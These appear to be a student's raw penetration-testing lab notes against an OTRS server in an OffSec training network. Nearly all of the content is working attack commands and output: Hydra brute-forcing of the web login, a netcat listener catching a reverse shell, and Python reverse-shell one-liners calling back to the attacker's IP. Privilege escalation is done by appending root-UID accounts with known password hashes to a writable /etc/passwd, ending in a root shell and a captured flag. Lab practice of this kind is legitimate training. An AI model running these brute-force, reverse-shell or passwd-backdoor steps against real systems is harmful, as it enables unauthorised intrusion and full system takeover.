```shell
#going to lookup otrs 5 default credentials.

root@localhost	root

#tried cewl to generate wordlist
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200]
└─# cewl -w wordlist.txt -m 8 https://10.11.1.39/otrs/index.pl
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
Couldn't hit the site https://10.11.1.39/otrs/index.pl, moving on
                                                                                                                     
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200]
└─# cewl -w wordlist.txt -m 8 http://10.11.1.39/otrs/index.pl 
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
                                                                                                                     
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200]
└─# ls
10.11.1.14   10.11.1.234  10.11.1.35  10.11.1.75     nc.exe       PrintSpoofer.exe  rev.exe         wordlist.txt
10.11.1.231  10.11.1.31   10.11.1.39  aspx_cmd.aspx  PowerUp.ps1  rev.aspx          winPEASx64.exe
                                                                                                                     
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200]
└─# cat wordlist.txt                                         
required
Password
JavaScript
Username
Copyright
Software
licenses
Available
experience
browsers
documentation
information
password


cewl -d 1 -m 8 -w cewl.txt http:10.11.1.39/otrs/index.pl

# generated wordlists using cewl, going to use them.
```

```shell
hydra 10.11.1.39 http-form-post
"/otrs/index.pl:user=root@localhost&pass=^PASS^:INVALID LOGIN" -l root@localhost -P
cewl2.txt -vV -f

hydra -t 64 -l root@localhost -P wordlist.txt 10.11.1.39 http-form-post '/otrs/index.pl:User=^USER^&Password=^PASS^:Login failed! Your user name or password was entered incorrectly.'


hydra 10.11.1.39 -s 80 http-form-post "/otrs/index.pl:user=^USER^&password=^PASS^:Error message" -l root@localhost -P cewl2.txt -t 20

#worked, had to put Action=Login
hydra 10.11.1.39 http-post-form "/otrs/index.pl:Action=Login&User=^USER^&Password=^PASS^:incorrectly." -l root@localhost -P cewl.txt -v


#cewl used to generate password wordlist  
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.39]
└─# cewl http://10.11.1.39/otrs/index.pl -w cewlfull.txt

┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.39]
└─# hydra 10.11.1.39 http-post-form "/otrs/index.pl:Action=Login&User=^USER^&Password=^PASS^:incorrectly." -l root@localhost -P cewlfull.txt -v
^[[3~Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-22 19:46:55
[DATA] max 16 tasks per 1 server, overall 16 tasks, 71 login tries (l:1/p:71), ~5 tries per task
[DATA] attacking http-post-form://10.11.1.39:80/otrs/index.pl:Action=Login&User=^USER^&Password=^PASS^:incorrectly.
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http[s]://10.11.1.39:80/otrs/index.pl?
[80][http-post-form] host: 10.11.1.39   login: root@localhost   password: otrs
[STATUS] attack finished for 10.11.1.39 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-22 19:47:00

```

```shell
#RCE SEARCHSPLOT

OTRS 5.0.x/6.0.x - Remote Command Execution (1)                                    | perl/webapps/43853.txt

#followed this script and got RCE

┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 3232          
listening on [any] 3232 ...
connect to [192.168.119.157] from (UNKNOWN) [10.11.1.39] 50891
bash: no job control in this shell
bash-4.2$ 

#ss -ant

bash-4.2$ ss -ant
ss -ant
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN     0      50           *:3306                     *:*                  
LISTEN     0      128          *:80                       *:*                  
LISTEN     0      128          *:22                       *:*                  
LISTEN     0      100    127.0.0.1:25                       *:*                  
ESTAB      0      0      127.0.0.1:34822              127.0.0.1:8080               
ESTAB      0      0      127.0.0.1:3306               127.0.0.1:46537              
ESTAB      0      0      127.0.0.1:41114              127.0.0.1:3306               
ESTAB      0      0      127.0.0.1:41395              127.0.0.1:3306               
ESTAB      0      0      127.0.0.1:3306               127.0.0.1:38235              
ESTAB      0      0      127.0.0.1:3306               127.0.0.1:41686              
ESTAB      0      0      127.0.0.1:3306               127.0.0.1:41791              
ESTAB      0      0      127.0.0.1:3306               127.0.0.1:41279              
ESTAB      0      0      127.0.0.1:41279              127.0.0.1:3306               
ESTAB      0      0      10.11.1.39:80                 192.168.119.157:41916              
ESTAB      0      0      127.0.0.1:3306               127.0.0.1:46509              
ESTAB      0      0      127.0.0.1:3306               127.0.0.1:41114              
ESTAB      0      0      127.0.0.1:3306               127.0.0.1:41104              
ESTAB      0      0      127.0.0.1:41104              127.0.0.1:3306               
ESTAB      0      0      127.0.0.1:3306               127.0.0.1:41102              
ESTAB      0      0      127.0.0.1:41102              127.0.0.1:3306               
ESTAB      0      0      127.0.0.1:46525              127.0.0.1:3306               
ESTAB      0      0      127.0.0.1:41193              127.0.0.1:3306               
ESTAB      0      0      127.0.0.1:3306               127.0.0.1:46525              
ESTAB      0      0      127.0.0.1:46537              127.0.0.1:3306               
ESTAB      0      0      127.0.0.1:38235              127.0.0.1:3306               
ESTAB      0      0      127.0.0.1:41687              127.0.0.1:3306               
ESTAB      0      0      127.0.0.1:41686              127.0.0.1:3306               
ESTAB      0      0      127.0.0.1:46509              127.0.0.1:3306               
ESTAB      0      0      127.0.0.1:46526              127.0.0.1:3306               
ESTAB      0      98     10.11.1.39:50895              192.168.119.157:3232               
ESTAB      0      0      127.0.0.1:3306               127.0.0.1:46526              
ESTAB      0      0      127.0.0.1:41791              127.0.0.1:3306               
ESTAB      0      0      127.0.0.1:3306               127.0.0.1:41395              
ESTAB      0      0      127.0.0.1:3306               127.0.0.1:41193              
ESTAB      0      0      127.0.0.1:3306               127.0.0.1:41687              
LISTEN     0      128         :::8080                    :::*                  
LISTEN     0      128         :::80                      :::*                  
LISTEN     0      128         :::22                      :::*                  
LISTEN     0      100        ::1:25                      :::*                  
ESTAB      0      0         ::ffff:127.0.0.1:8080                  ::ffff:127.0.0.1:34822              
bash-4.2$ 
```

```shell
#continuing enumeration

bash-4.2$ hostname
hostname
leftturn.thinc

bash-4.2$ uname -a
uname -a
Linux leftturn.thinc 3.10.0-327.4.5.el7.x86_64 #1 SMP Mon Jan 25 22:07:14 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux

#file owned by httpd in here
bash-4.2$ pwd 
pwd
/run

# found directory that apache has access to, looking around
drwxr-xr-x.  9 otrs apache 4096 Feb  5  2016 otrs
bash-4.2$ cat otrs
cat otrs
cat: otrs: Is a directory
bash-4.2$ cd otrs
cd otrs
bash-4.2$ ls
ls
ARCHIVE
AUTHORS.md
CHANGES.md
CONTRIBUTING.md
COPYING
COPYING-Third-Party
Custom
INSTALL.md
Kernel
README.md
RELEASE
UPGRADING.md
bin
doc
i18n
scripts
var
bash-4.2$ 

```


![[5. potential pric esc.png]]

```shell
#have to run script in restore.sh after editing /opt/otrs/var/passwd

bash-4.2$ cat restore.sh
cat restore.sh
#!/bin/sh

/usr/bin/cp -f  /opt/otrs/var/passwd /etc/passwd 2>/dev/null
/usr/bin/chmod 0777 /etc/passwd 2>/dev/null

bash-4.2$ ./restore.sh
./restore.sh
bash-4.2$ 

echo "apache:x:0:0:Apache:/usr/share/httpd:/sbin/nologin" >> /etc/passwd

echo "apache:x:0:0:root:/root:/bin/bash" >> /etc/passwd

mount | grep tmpfs
```


```shell
#shows where you can and cant write

bash-4.2$ mount | grep tmpfs
mount | grep tmpfs
devtmpfs on /dev type devtmpfs (rw,nosuid,size=498324k,nr_inodes=124581,mode=755)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
tmpfs on /run type tmpfs (rw,nosuid,nodev,mode=755)
tmpfs on /run/user/1004 type tmpfs (rw,nosuid,nodev,relatime,size=101712k,mode=700,uid=1004,gid=1004)


bash-4.2$ echo "apache:x:0:0:Apache:/usr/share/httpd:/sbin/nologin" > /etc/passwd
<0:Apache:/usr/share/httpd:/sbin/nologin" > /etc/passwd                      
bash-4.2$ cat /etc/passwd
cat /etc/passwd
apache:x:0:0:Apache:/usr/share/httpd:/sbin/nologin


echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.157",2323))" > /etc/passwd

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.157",2323))


python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.119.157",2323));os.dup2(s.fileno(),0); os.dup2(s.fileno(), *$ 1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'


sh-4.2$ cat passwd
cat passwd
pwnd:.:0:0:test:/root:/bin/bash



user2:*:0:0:/root:/root:/bin/bash
# going to try this tommorow, i keep getting kicked off.
user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root:/root:/bin/bash
pass123

echo "user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root:/root:/bin/bash" >> /etc/passwd

cd /opt/otrs/scripts
```

```shell
# web page reverse shells
python 
-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.157",4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'


python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.157",4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

```


```shell
# made ssl password
┌──(root㉿kali)-[/home/kali]
└─# openssl passwd password
$1$DxqZfbqb$tvjvjykE/vNbZ7R5uVVLv1

echo "user4:$1$DxqZfbqb$tvjvjykE/vNbZ7R5uVVLv1:0:0:/root:/root:/bin/bash" >> /etc/passwd

# did not work.
bash-4.2$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
jerry:x:1003:1003:jerry:/var/jerry:/bin/bash
systemd-bus-proxy:x:998:996:systemd Bus Proxy:/:/sbin/nologin
systemd-network:x:997:995:systemd Network Management:/:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
otrs:x:1004:1004:OTRS user:/opt/otrs/:/bin/bash
nginx:x:996:993:Nginx web server:/var/lib/nginx:/sbin/nologin
user4:/vNbZ7R5uVVLv1:0:0:/root:/root:/bin/bash
bash-4.2$ su user4
su user4
Password: password
su: Authentication failure
bash-4.2$ 


# trying crypt salt
# contents of /etc/passwd take priority over the /etc/shadow file which is why this works.
┌──(root㉿kali)-[/home/kali]
└─# perl -le 'print crypt("pass123", "abc")'
abBxjdJQWn8xw

echo "user5:abBxjdJQWn8xw:0:0:/root:/root:/bin/bash" >> /etc/passwd

#worked! followed this : https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/
user5:abBxjdJQWn8xw:0:0:/root:/root:/bin/bash
bash-4.2$ su user5
su user5
Password: pass123
whoami
root


pwd
/root
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:50:56:86:cc:20 brd ff:ff:ff:ff:ff:ff
    inet 10.11.1.39/16 brd 10.11.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe86:cc20/64 scope link 
       valid_lft forever preferred_lft forever
cat proof.txt
1dcca23355272056f04fe8bf20edfce0



